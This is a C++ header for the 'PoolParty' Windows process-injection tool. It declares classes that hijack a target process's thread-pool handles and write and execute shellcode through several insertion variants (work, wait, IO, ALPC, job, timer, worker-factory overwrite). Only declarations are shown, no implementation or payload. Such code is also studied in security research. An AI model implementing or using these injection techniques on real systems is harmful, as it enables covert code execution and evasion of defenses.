#pragma once

#include <boost/log/core.hpp>
#include <boost/log/trivial.hpp>
#include <boost/log/expressions.hpp> 
#include <boost/format.hpp>
#include <boost/log/utility/setup/console.hpp>
#include <boost/log/utility/setup/common_attributes.hpp>

#include <codecvt>

#include <Windows.h>

#include "Misc.hpp"
#include "Native.hpp"
#include "WorkerFactory.hpp"
#include "ThreadPool.hpp"
#include "WinApi.hpp"
#include "HandleHijacker.hpp"

#define POOL_PARTY_POEM "Dive right in and make a splash,\n" \
                        "We're throwing a pool party in a flash!\n" \
                        "Bring your swimsuits and sunscreen galore,\n" \
                        "We'll turn up the heat and let the good times pour!\n"

#define POOL_PARTY_ALPC_PORT_NAME L"\\RPC Control\\PoolPartyALPCPort"
#define POOL_PARTY_EVENT_NAME L"PoolPartyEvent"
#define POOL_PARTY_FILE_NAME L"PoolParty.txt"
#define POOL_PARTY_JOB_NAME L"PoolPartyJob"

#define INIT_UNICODE_STRING(str) { sizeof(str) - sizeof((str)[0]), sizeof(str) - sizeof((str)[0]), const_cast<PWSTR>(str) }

namespace logging = boost::log;
namespace keywords = boost::log::keywords;

typedef struct _POOL_PARTY_CMD_ARGS
{
	BOOL bDebugPrivilege;
	int VariantId;
	int TargetPid;
} POOL_PARTY_CMD_ARGS, * PPOOL_PARTY_CMD_ARGS;

class PoolParty
{
protected:
	DWORD m_dwTargetPid;
	std::shared_ptr<HANDLE> m_p_hTargetPid;
	unsigned char* m_cShellcode;
	SIZE_T m_szShellcodeSize;
	PVOID m_ShellcodeAddress;
public:
	PoolParty(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize);
	std::shared_ptr<HANDLE> GetTargetThreadPoolWorkerFactoryHandle() const;
	WORKER_FACTORY_BASIC_INFORMATION GetWorkerFactoryBasicInformation(HANDLE hWorkerFactory) const;
	std::shared_ptr<HANDLE> GetTargetThreadPoolIoCompletionHandle() const;
	std::shared_ptr<HANDLE> GetTargetThreadPoolTimerHandle() const;
	std::shared_ptr<HANDLE> GetTargetProcessHandle() const;
	virtual void HijackHandles();
	virtual LPVOID AllocateShellcodeMemory() const;
	void WriteShellcode() const;
	virtual void SetupExecution() const PURE;
	void Inject();
	virtual ~PoolParty() = default;
};

class AsynchronousWorkItemInsertion : public PoolParty {
protected:
	std::shared_ptr<HANDLE> m_p_hIoCompletion;
public:
	AsynchronousWorkItemInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize);
	void HijackHandles() override;
	virtual void SetupExecution() const PURE;
	virtual ~AsynchronousWorkItemInsertion() = default;
};

class WorkerFactoryStartRoutineOverwrite : public PoolParty {
protected:
	std::shared_ptr<HANDLE> m_p_hWorkerFactory;
	WORKER_FACTORY_BASIC_INFORMATION m_WorkerFactoryInformation;
public:
	WorkerFactoryStartRoutineOverwrite(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize);
	void HijackHandles() override;
	LPVOID AllocateShellcodeMemory() const override;
	void SetupExecution() const override;
	~WorkerFactoryStartRoutineOverwrite() override = default;
};

class RemoteTpWorkInsertion : public PoolParty {
protected:
	std::shared_ptr<HANDLE> m_p_hWorkerFactory;
public:
	RemoteTpWorkInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize);
	void HijackHandles() override;
	void SetupExecution() const override;
	~RemoteTpWorkInsertion() override = default;
};

class RemoteTpWaitInsertion : public AsynchronousWorkItemInsertion {
public:
	RemoteTpWaitInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize);
	void SetupExecution() const override;
	~RemoteTpWaitInsertion() override = default;
};

class RemoteTpIoInsertion : public AsynchronousWorkItemInsertion {
public:
	RemoteTpIoInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize);
	void SetupExecution() const override;
	~RemoteTpIoInsertion() override = default;
};

class RemoteTpAlpcInsertion : public AsynchronousWorkItemInsertion {
public:
	RemoteTpAlpcInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize);
	void SetupExecution() const override;
	~RemoteTpAlpcInsertion() override = default;
};

class RemoteTpJobInsertion : public AsynchronousWorkItemInsertion {
public:
	RemoteTpJobInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize);
	void SetupExecution() const override;
	~RemoteTpJobInsertion() override = default;
};

class RemoteTpDirectInsertion : public AsynchronousWorkItemInsertion {
public:
	RemoteTpDirectInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize);
	void SetupExecution() const override;
	~RemoteTpDirectInsertion() override = default;
};

class RemoteTpTimerInsertion : public PoolParty {
protected:
	std::shared_ptr<HANDLE> m_p_hWorkerFactory;
	std::shared_ptr<HANDLE> m_p_hTimer;
public:
	RemoteTpTimerInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize);
	void HijackHandles() override;
	void SetupExecution() const override;
	~RemoteTpTimerInsertion() override = default;
};